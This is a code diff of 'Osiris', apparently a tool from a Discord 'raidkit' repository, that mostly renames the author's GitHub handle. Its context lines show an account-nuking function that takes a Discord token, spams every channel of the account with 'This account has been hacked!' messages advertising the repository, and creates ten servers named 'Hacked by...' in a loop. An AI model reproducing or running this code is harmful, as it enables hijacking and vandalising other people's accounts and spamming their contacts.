@@ -16,7 +16,7 @@ The creator of the Jajaja account nuker, @azaelgg, has given me full permission 
 """
 
 
-# Scripted by Catterall/azaelgg (https://github.com/Catterall) (https://github.com/azaelgg).
+# Scripted by the-cult-of-integral/azaelgg (https://github.com/the-cult-of-integral) (https://github.com/azaelgg).
 # Osiris Tool under the GNU General Public Liscense v2 (1991).
 
 
@@ -25,7 +25,6 @@ The creator of the Jajaja account nuker, @azaelgg, has given me full permission 
 import threading
 import requests
 import discord
-import random
 import os
 import re
 from time import sleep
@@ -53,7 +52,7 @@ def search_for_updates():
     header = {
         "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
         "X-Requested-With": "XMLHttpRequest"}
-    url = f"https://github.com/Catterall/discord-raidkit/releases/latest"
+    url = f"https://github.com/the-cult-of-integral/discord-raidkit/releases/latest"
 
     os.system('cls')
     print("Searching for updates.")
@@ -172,7 +171,7 @@ def accountNuke(token):
         try:
             requests.post(f'https://discord.com/api/v8/channels/{id}/messages', 
             headers=headers, 
-            data={"content": "This account has been hacked! Don't believe me? Check out my GitHub! https://github.com/Catterall/discord-raidkit"})
+            data={"content": "This account has been hacked! Don't believe me? Check out my GitHub! https://github.com/the-cult-of-integral/discord-raidkit"})
             print(f"{Fore.RED}Messaged ID: {Fore.WHITE}{id}.{Fore.RESET}")
         except Exception as e:
             print(f"The following exception has been encountered and is being ignored: {e}")
@@ -207,7 +206,7 @@ def accountNuke(token):
     
     for i in range(10):
         try:
-            payload = {'name': 'Hacked by Catterall\'s Discord Raidkit!', 'region': 'europe', 'icon': None, 'channels': None}
+            payload = {'name': 'Hacked by the-cult-of-integral\'s Discord Raidkit!', 'region': 'europe', 'icon': None, 'channels': None}
             requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)
             print(f"{Fore.BLUE}Created advert server #{i}.{Fore.RESET}")
         except Exception as e:
@@ -245,7 +244,7 @@ def main():
 {Fore.YELLOW}[3] {Fore.LIGHTBLUE_EX}Log into an account.
 {Fore.YELLOW}[4] {Fore.LIGHTBLUE_EX}Exit.{Style.RESET_ALL}
 
-{Fore.GREEN}Osiris created by Catterall (View for full guide): https://www.github.com/Catterall/discord-raidkit
+{Fore.GREEN}Osiris created by the-cult-of-integral (View for full guide): https://www.github.com/the-cult-of-integral/discord-raidkit
 '''
     print(banner)
     choice = str(input(
@@ -312,5 +311,5 @@ if __name__ == "__main__":
     search_for_updates()
     main()
 
-# Scripted by Catterall/azaelgg (https://github.com/Catterall) (https://github.com/azaelgg).
+# Scripted by the-cult-of-integral/azaelgg (https://github.com/the-cult-of-integral) (https://github.com/azaelgg).
 # Osiris Tool under the GNU General Public Liscense v2 (1991).
